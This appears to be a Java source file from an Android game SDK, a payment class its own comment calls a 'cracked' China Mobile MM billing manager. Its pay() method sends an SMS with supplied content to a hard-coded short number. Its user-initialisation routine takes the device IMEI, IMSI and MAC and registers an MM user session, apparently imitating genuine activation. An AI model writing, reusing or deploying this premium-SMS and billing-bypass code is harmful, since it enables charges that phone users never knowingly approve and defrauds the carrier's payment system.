package mobi.zty.pay.sdk.mmNetFee;

import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.util.LocalStorage;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class MMNetFeeInstance extends PaymentInterf{
	private static MMNetFeeInstance instance;
	public static MMNetFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized MMNetFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new MMNetFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		// TODO Auto-generated method stub
		
	}

	@Override
	public void pay(Context context, Object... parameters) {
		String content = (String) parameters[0];
		String num ="1065842410";
    	Intent itSend = new Intent(GameSDK.SENT_SMS_ACTION);  
        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
        GameSDK.getInstance().bCallback = 0; 
		Util_G.sendTextMessage(context, num, content, mSendPI,0);	
	}
	
	public  void doInitUser(final Context activity, final String imei, final String imsi,
			final String mac, final String strChannelID, final String appkey, final String packegename,
			final String mainActivity) {
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				String sid = LocalStorage.getInstance(activity).getString("user_sid",
						"");
				if (sid == null || sid.trim().equals("")) {//激活用户
					MMUser mmUser = new MMUser(imei, imsi, mac, strChannelID, appkey);
					mmUser.initData(activity);
					if (packegename!=null&&!packegename.equals("")) {
						mmUser.packageName = packegename;
					}
					if (mainActivity!=null&&!mainActivity.equals("")) {
						mmUser.MainActivity = mainActivity ;
					}
					mmUser.initUser();
					LocalStorage.getInstance(activity).putString("user_sid", mmUser.sid);
				} else {//启动用户
					MMUser mmUser = new MMUser(imei, imsi, mac, strChannelID, appkey);
					mmUser.initData(activity);
					if (packegename!=null&&!packegename.equals("")) {
						mmUser.packageName = packegename;
					}
					if (mainActivity!=null&&!mainActivity.equals("")) {
						mmUser.MainActivity = mainActivity ;
					}
					mmUser.doact(sid);
					mmUser.doacttime(sid);
				}
			}
		}).start();
	}

}
